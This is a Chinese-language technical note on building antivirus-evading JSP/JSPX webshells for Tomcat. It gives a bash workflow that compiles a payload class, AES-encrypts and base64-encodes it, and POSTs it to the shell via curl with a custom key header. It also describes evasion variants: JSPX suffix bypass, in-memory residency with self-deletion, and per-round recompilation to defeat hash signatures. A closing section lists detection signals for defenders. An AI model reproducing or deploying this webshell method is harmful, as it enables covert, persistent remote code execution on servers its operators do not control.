# JSP/JSPX webshell 免杀（07-webshell-langs / JSP 支线）

- 部署：drop-in 至 Tomcat webapps 任意目录（首次请求即时编译，无预编译步骤）。
- 执行体打包（本地实验环境：Runner 示例 → 请求构造）：
  ```bash
  # 执行体契约：public static String run(String arg)，如：
  #   public class Runner { public static String run(String a) { return "demo:" + a; } }
  javac -d . Runner.java
  IV=$(openssl rand -hex 16); KEY=$(openssl rand -hex 16)
  T=$(printf '%s' "$(echo $IV$KEY | xxd -r -p)" | base64)                    # X-K
  CLS=$(openssl enc -aes-128-cbc -in Runner.class -K "$KEY" -iv "$IV" | base64)  # body
  curl -s -X POST -H "X-K: $T" --data-binary "$CLS" http://target/x.jsp
  ```
- 技术侧（形态谱系）：①关键字变形马 ②加密通讯马 ③字节码马（本实现：自定义 ClassLoader 把
  defineClass 公开化、AES-128-CBC 解密、0xCAFEBABE 魔数校验、执行体为运行时类、X-A 头加密
  传参、错误全静默 404）④表达式驻留（EL/OGNL，衔接 08 内存马）。
- 变体登记：JSPX（XML 形态绕后缀策略）；taglib 混淆；落地即转内存驻留并自删；执行体每轮
  重编译/混淆（字节码哈希不沉淀为样本特征）。
- 检测侧配对：
  1. RASP/JVMTI：defineClass / ClassLoader 动态定义类遥测（本马必经点）；
  2. 静态：JSP 编译后类与 .jsp 源文件行为模型（页面里只有解密+类加载的孤立结构）；
  3. 流量：高熵 base64 密文 POST + 固定 200/404 状态分布 + X-K/X-A 自定义头组合；
  4. JVM 层：非磁盘来源类加载审计（-XX:+TraceClassLoading / attach 后类清单比对）。
- 判定表（本地实测后填）：| 引擎 | 结果 | 原文行 |
  scriptlet 内 Java 段做过人工复核与括号配对粗检；运行时验证未做，判定表留待本地实测后填。
